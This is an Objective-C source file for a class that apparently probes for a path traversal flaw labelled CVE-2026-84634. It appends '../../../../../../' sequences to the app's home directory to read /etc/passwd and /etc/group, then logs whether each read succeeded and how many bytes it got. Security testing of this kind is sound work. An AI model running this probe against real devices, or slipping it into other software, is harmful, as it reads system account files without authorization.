#import <Foundation/Foundation.h>

@interface PathTraversal : NSObject
+ (void)testTraversal:(void (^)(NSString *))log;
@end

@implementation PathTraversal

+ (void)testTraversal:(void (^)(NSString *))log {
    log(@"  [*] Testing path traversal (CVE-2026-84634)...");
    
    NSString *home = NSHomeDirectory();
    NSArray *targets = @[@"/etc/passwd", @"/etc/group"];
    
    for (NSString *target in targets) {
        NSString *traversal = [@"../../../../../../" stringByAppendingString:target];
        NSString *path = [home stringByAppendingPathComponent:traversal];
        
        NSData *data = [NSData dataWithContentsOfFile:path];
        if (data) {
            log([NSString stringWithFormat:@"  [+] Read %@: %lu bytes", target, (unsigned long)data.length]);
        } else {
            log([NSString stringWithFormat:@"  [-] Cannot read %@", target]);
        }
    }
    
    log(@"  [*] Path traversal test complete (read-only)");
}

@end
